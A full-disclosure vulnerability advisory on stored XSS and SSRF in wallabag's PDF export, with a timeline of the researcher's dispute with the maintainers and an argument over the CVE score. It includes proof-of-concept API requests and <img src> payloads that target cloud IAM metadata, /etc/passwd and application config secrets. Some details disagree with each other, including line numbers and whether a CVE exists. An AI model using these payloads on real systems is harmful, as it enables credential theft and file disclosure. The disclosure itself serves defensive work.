# WALLABAG-FULL-DISCLOSURE-Stored-XSS-SSRF-CVSS-8.5-GHSA-q2g2-
This is a full disclosure. The vulnerability was reported to the wallabag maintainers via GitHub Private Security Advisory on June 5, 2026. 3 FIX NO 1 MERGE NO CVE
This is a full disclosure. The vulnerability was reported to the wallabag maintainers via GitHub Private Security Advisory on June 5, 2026. Over the following ten weeks, the researcher submitted three complete patches, each adapted to the maintainer's specific and evolving requirements. The final patch resolved every requested code review point with all tests passing. The maintainer stopped responding after July 10, closed the PR without merge on August 8, and released wallabag 2.6.14 without the fix. No CVE was requested or assigned by the project. CAN-2026-2035733 has been reserved through MITRE CNA-LR. This publication follows the exhaustion of all coordinated disclosure channels.

<img width="1039" height="813" alt="Immagine 2026-08-14 160915" src="https://github.com/user-attachments/assets/1ec36504-79bf-472d-bb17-4a262d7fa4c4" />


<img width="1080" height="2520" alt="39f2b0a50afc2613" src="https://github.com/user-attachments/assets/25bd18dc-7710-4ce3-bf23-cf89a96ce13b" />


# Summary

Wallabag (<= 2.6.14) stores article `title` and `content` without sanitization. The `title` field receives **no filtering whatsoever**. The `content` field is only weakly filtered by `htmLawed`; `HTMLPurifier` is completely absent from the codebase. Both fields are later passed raw to `TCPDF::writeHTMLCell()` during PDF export, allowing an authenticated attacker to trigger Server-Side Request Forgery (SSRF) from the Wallabag server.

# Details

## 1 — Missing sanitization (Stored XSS)

`src/Controller/Api/EntryRestController.php` ~line 965:

```php
$entry->setTitle($data['title']); // no sanitization applied
```

`src/Helper/ContentProxy.php` ~line 263:

```php
$entry->setContent($content); // only htmLawed, no HTMLPurifier
```

Both fields are serialized and exposed raw by the REST API (`/api/entries`) and rendered with `|raw` in Twig templates (`entry.html.twig:370`, `share.html.twig:31`).

## 2 — SSRF via TCPDF (unsanitized content passed to PDF renderer)

`src/Helper/EntriesExport.php` lines 296–300:

```php
$html = '<h1>' . $entry->getTitle() . '</h1>';
$html .= $entry->getContent();  // unsanitized attacker-controlled HTML
$pdf->writeHTMLCell(0, 0, null, null, $html, 0, 1); // TCPDF fetches <img src>
```

TCPDF (v6.11.3) fetches all `<img src="...">` URLs server-side. No protocol or host allowlist exists in the code.

# PoC

## Step 1 — Attacker creates a malicious entry

```http
POST /api/entries
Authorization: Bearer <token>
Content-Type: application/json

{
  "url": "https://example.com",
  "content": "<img src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">",
  "title": "SSRF Test"
}
```

## Step 2 — Trigger PDF export (attacker's own account is sufficient)

```http
GET /api/entries/{id}/export.pdf
Authorization: Bearer <token>
```

**Result**: The Wallabag server performs an HTTP GET request to `http://169.254.169.254/...`. In AWS/GCP/Azure environments with IMDSv1 enabled, this returns IAM credentials. The same technique works with `file:///etc/passwd` for Local File Read.

# Impact

* **Stored XSS**: JavaScript executes in any authenticated user's browser viewing the article, enabling session hijacking and Account Takeover.
* **SSRF**: Wallabag server makes arbitrary HTTP/file requests to internal network resources (cloud metadata, Redis, internal APIs).
* **Local File Read**: `file://` protocol allows reading server-side files (e.g. `/etc/passwd`, application config files containing DB credentials).
* **Chained RCE** (environment-dependent): In cloud environments with IMDSv1, SSRF leads to IAM credential theft and full cloud account compromise.

# CVSS Discrepancy: MITRE Published Record vs. Source Code Evidence

On 2026-08-28, MITRE published **CVE-2026-82081** with the following record:

* **CVSS 3.1 base score:** 6.4 (Medium)
* **CWE:** CWE-918 (Server-Side Request Forgery) — **only**
* **Confidentiality metric:** `C:L` (Low)

The original CNA-LR submission carried a base score of **8.5** with vector `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` and referenced two distinct weaknesses (CWE-918 and CWE-79). The published record diverges from the submission on two points:

1. **Confidentiality was lowered** from `H` to `L`.
2. **CWE-79 (Improper Neutralization of Input During Web Page Generation — Stored XSS) was removed** from the record.

An independent audit against the upstream source (`wallabag/wallabag`, branch `master`, commit consistent with release 2.6.14) documents that neither change is supported by the code.

## Evidence for the omitted CWE-79 (Stored XSS)

* `src/Controller/Api/EntryRestController.php:987` — `$entry->setTitle($data['title'])` is called with no sanitization, encoding, or validation between the request body and the database write.
* `src/Helper/ContentProxy.php:273` — `$entry->setContent($content['html'])` persists the payload byte-for-byte; the only `sanitize*` symbols in `src/` are `sanitizeContentTitle()` / `sanitizeUTF8Text()` (UTF-8 encoding normalization, not HTML filtering) and `svgSanitize\Sanitizer` in `DownloadImages.php` (SVG-only, applied to downloaded images).
* **`HTMLPurifier` is not present in the codebase.** A recursive grep for `HTMLPurifier|htmlpurifier` across the repository and `composer.json` returns zero matches.
* The stored content is rendered with the Twig `|raw` filter — which explicitly disables auto-escaping — in three templates:
  * `templates/Entry/entry.html.twig:370`
  * `templates/Entry/share.html.twig:31`
  * `templates/Entry/entries.xml.twig:49`

An `<script>` payload injected via `POST /api/entries` therefore reaches the DOM of any authenticated user viewing the article in the application's own origin, enabling session hijacking and account takeover. The vulnerability class corresponds directly to CWE-79 and its omission from the published record is inconsistent with the source.

## Evidence for the Confidentiality downgrade (`H` → `L`)

* `src/Helper/EntriesExport.php:286-300` concatenates the unsanitized values of `$entry->getTitle()` and `$entry->getContent()` and passes them to `TCPDF::writeHTMLCell()`.
* The TCPDF dependency is declared at `composer.json:160` (`"tecnickcom/tcpdf": "^6.8.2"`). TCPDF resolves `<img src>` attributes through the native PHP stream wrappers with **no protocol allowlist, no host restriction, and no filter on link-local or RFC1918 targets**.
* No mitigation is present in the surrounding code path: no `CURLOPT_PROTOCOLS` restriction, no pre-render filter on `<img>`, no SSRF guard middleware, no `stream_context_create` with protocol filtering.

Consequences directly reachable from an attacker-controlled article body:

| Payload | Server-side effect |
|---|---|
| `<img src="file:///etc/passwd">` | Local file read via the `file://` wrapper |
| `<img src="file:///var/www/wallabag/app/config/parameters.yml">` | Disclosure of database credentials and Symfony secrets |
| `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` | Cloud instance metadata read (IMDSv1) — IAM credential exposure |
| `<img src="http://127.0.0.1:9200/_search">` | Discovery and read from unexposed internal services |

The demonstrable read of arbitrary local files and cloud instance credentials is inconsistent with a `C:L` rating.

## Corrected CVSS vector based on source evidence

Considering both weaknesses that the record should represent — CWE-918 and CWE-79 — the vector aligned with the code is:

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L   →   9.0 Critical
```

| Metric | Value | Rationale |
|---|---|---|
| AV | N | Reachable via the HTTP API |
| AC | L | No special conditions beyond holding a valid account |
| PR | L | Any authenticated user can `POST /api/entries` |
| UI | N | Passive activation on entry view (XSS) or standard export flow (SSRF) |
| S | C | SSRF crosses the application's security authority (cloud metadata, RFC1918, host filesystem); XSS in application origin can act on external tokens |
| C | H | Local file contents + cloud IAM credentials + session cookies |
| I | H | XSS enables arbitrary actions in the victim's session |
| A | L | Partial DoS reachable through malformed injected payloads |

# Affected component versions

**Wallabag:** 2.7.0-dev (commit 4504e3c, branch master) / latest stable: 2.6.14

**TCPDF:** 6.11.3

**htmLawed (fossar/htmlawed):** 1.3.3

**HTMLPurifier:** not present

---

# Wallabag Vulnerability Resolution Timeline (GHSA-q2g2-www6-wf5h)

This timeline tracks the events from the opening of the advisory to the epilogue documented in mid-August 2026, highlighting the evolution of the patch, the maintainers' management, and the final stalemate.

### June 5, 2026
* **Advisory Opened:** FUNFACTOR1 opens a private draft for the GHSA-q2g2-www6-wf5h advisory with a "High" severity level.
* **Credits Assigned:** FUNFACTOR1 adds himself as a collaborator. He receives and accepts the credit as "reporter". Subsequently, the role undergoes various oscillations until stabilizing.

### June 28, 2026
* **Report Accepted:** yguedidi officially accepts the vulnerability report.
* **Details Archived:** yguedidi adds a private comment to preserve the original report for triage and audit purposes. The report highlights the lack of sanitization on the title and content fields, leading to critical risks of Stored XSS, Server-Side Request Forgery (SSRF), and Local File Read via the TCPDF library.

### June 30, 2026 - Fix #1 (Custom Logic)
* **Fork Created:** FUNFACTOR1 creates the temporary private fork `wallabag/wallabag-ghsa-q2g2-www6-wf5h`.
* **PR #1 Submitted (Fix #1):** FUNFACTOR1 announces the opening of Pull Request #1. This patch implements custom sanitization logic based on a "fail-closed" allowlist model. He requests review, merge, and CVE assignment within 7 days.

### July 2, 2026
* **PR #1 Code Review:** yguedidi requests the PR to be based on the 2.6 branch. He expresses doubts about re-implementing custom logic, suggesting the use of an established library and the Twig engine.
* **DB Migration Requested:** In a separate comment, yguedidi suggests sanitizing the data *before* saving it to the database, asking to add a DB migration to the fix.
* **DB Modification Rejected:** FUNFACTOR1 formally rejects the request. He explains that such an operation is **out of scope** for a security patch and that migrating existing content represents a **high risk** for user saves, requiring design and rollback plans. He offers to collaborate on this implementation in the future, but as a separate effort.

### July 6, 2026 - Fix #2 (Introduction of HTMLPurifier)
* **PR #1 Closed with Unmerged Commits:** yguedidi closes PR #1 explaining they will handle the upmerge of the 2.6 branch later. The commits of this PR are discarded and not merged.
* **PR #2 Submitted and Reviewed (Fix #2):** To accommodate the maintainer's request, FUNFACTOR1 abandons the custom logic and introduces the standard library `HTMLPurifier` (Fix #2). 
* **7 Modifications Requested:** On this second fix, yguedidi requests 7 additional specific structural modifications, including service injection via dependency injection, the use of `Psr7\Uri`, and optimizations in Twig templates.
* **Title Updated:** The advisory title becomes the final one: *"PDF export may fetch external resources from stored entry HTML"*.

### July 9, 2026
* **Ironic Prompt:** Having completed all the work, FUNFACTOR1 leaves an ironic comment asking yguedidi for his GitHub credentials to proceed autonomously with the merge and CVE request.

### July 10, 2026 - The Third Fix and the Ultimatum
* **Misunderstanding:** yguedidi takes the joke literally, calling it "weird" and inviting FUNFACTOR1 to stick to resolving the code review comments.
* **Third Fix Pushed:** FUNFACTOR1 clarifies the joke. He communicates that he just pushed the **Third Fix** (commit `4383ca0`), definitively resolving all 7 review points requested by yguedidi. He confirms that the PR is fully ready for merge, with no open comments or pending modifications.
* **Internal Discussions on Refactoring:** yguedidi is relieved by the joke but admits having temporarily "lost trust" because of it. He reveals that the maintainers are suddenly discussing whether `HTMLPurifier` (previously requested by himself) is too heavy a dependency, considering that `htmLawed` is already installed in the project. He promises updates shortly.
* **FUNFACTOR1's Final Ultimatum:** FUNFACTOR1 expresses strong frustration with yet another stalemate and the handling of the situation. He highlights that:
    1. The inclusion of `HTMLPurifier` was a specific request from yguedidi.
    2. He is delivering the **Third Fix** today, accommodating every single directive.
    3. Discussing the use of `htmLawed` makes no technical sense: the library was *already present* when the vulnerability was found and blatantly failed to protect the app.
    4. Blocking an urgent patch to discuss future refactoring leaves users severely exposed to vulnerabilities that will soon be public knowledge (citing similar incidents on Mozilla).
    5. He issues an ultimatum demanding an immediate decision (merge and CVE), without further delays.

### August 15, 2026 - THE END (Stalemate and Unresolved Vulnerability)
* **No Response from Maintainers:** Over a month after the July 10 ultimatum, the maintainers provided no response. There was total radio silence.
* **PR #2 Closed Without Merge:** Pull Request #2 containing the definitive Third Fix (and all associated tests) was closed without merge.
* **Wallabag 2.6.14 Released Unpatched:** Wallabag 2.6.14 was subsequently released without the security patch. 
* **No CVE Assigned:** The security advisory is permanently stuck in "Draft" status and no official CVE was requested or assigned (**"No known CVE"**).
* **Users Left Exposed:** Official documents confirm **"Patched versions: None"**. The Wallabag application remains vulnerable to Stored XSS and SSRF in its stable versions, negating months of investigation and the development of three complete technical solutions provided by the researcher.


### August 16, 2026
* **CVE Assignment:** CVE-2026-82081 (MITRE CNA-LR, published 2026-08-28). Public reference: [https://infosec.exchange/@FUNFACTOR1/117093620077858014](https://infosec.exchange/@FUNFACTOR1/117093620077858014)

Note on CVSS scoring discrepancy: see section "CVSS Discrepancy: MITRE Published Record vs. Source Code Evidence" below.

---

# Independent Scoring and NVD Review

The National Vulnerability Database (NVD) performs its own CVSS analysis on published CVE records, independent from the assigning CNA. NVD's Vulnerability Analysis Team routinely reviews scores where the published metrics diverge from the technical evidence available in the underlying source code.

The discrepancy documented in the section above — the removal of CWE-79 and the downgrade of Confidentiality from `H` to `L` — has been formally reported to MITRE on 2026-08-28 with the file/line evidence, dependency versions, and reproducible payloads listed above.

Analysts reviewing CVE-2026-82081 for independent enrichment are invited to consult the source-level evidence provided in this disclosure — file paths, line numbers, dependency declarations in `composer.json`, and the Twig rendering sinks — when producing their own assessment of the record.
